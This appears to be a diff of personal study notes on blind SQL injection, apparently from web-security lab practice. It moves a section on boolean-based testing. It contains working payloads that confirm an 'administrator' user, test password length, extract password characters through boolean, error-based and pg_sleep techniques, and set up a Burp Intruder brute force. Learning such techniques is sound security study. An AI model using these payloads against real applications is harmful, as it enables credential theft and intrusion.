@@ -1,16 +1,3 @@
-
-#### Testing booleans (for BSQLi)
-Remember to try `AND` `OR` `HAVING`  
-we can test the ability bruteforce/presence of users by selecting a char, limiting to 1 and then comparing, so the below would become `a=a`  
-`b' OR (select 'a' from users limit 1)='a`  
-Now we can take a step further and confirm we have a user called "Administrator"  
-`b' OR (select 'a' from users where username='administrator')='a`  
-The ball keeps on rolling, and we can begin the makings of bruteforce attack by testing the length of password  
-`b' OR (select 'a' from users where username='administrator' and length(password)>1)='a;`  
-Once we have the length of the password we can bruteforce with a python script or intruder.
-For intruder we use cluster bomb, and use the grep option to flag responses we know differ in `FALSE` and `TRUE`  
-`b' OR (select substring (password,§1§,1) from users where username='administrator')='§a§`  
-
 # BlindSQL:
 Truth must be "infered" generally with a sleep function, a 500 response, or DNS callout to webhooks/collaborator
 
@@ -29,7 +16,20 @@ Now we start to infer the existence of information (users, passwords, tables, et
 Length of password  
 `'||(SELECT CASE WHEN LENGTH(password)>2 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'. Then send: TrackingId='||(SELECT CASE WHEN LENGTH(password)>3 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
 
-### sleep examples
+
+#### Testing booleans (for BSQLi)
+Remember to try `AND` `OR` `HAVING`  
+we can test the ability bruteforce/presence of users by selecting a char, limiting to 1 and then comparing, so the below would become `a=a`  
+`b' OR (select 'a' from users limit 1)='a`  
+Now we can take a step further and confirm we have a user called "Administrator"  
+`b' OR (select 'a' from users where username='administrator')='a`  
+The ball keeps on rolling, and we can begin the makings of bruteforce attack by testing the length of password  
+`b' OR (select 'a' from users where username='administrator' and length(password)>1)='a;`  
+Once we have the length of the password we can bruteforce with a python script or intruder.
+For intruder we use cluster bomb, and use the grep option to flag responses we know differ in `FALSE` and `TRUE`  
+`b' OR (select substring (password,§1§,1) from users where username='administrator')='§a§`  
+
+#### sleep examples
 postgresql  
   * `'||pg_sleep(10)--`  
 mssql  
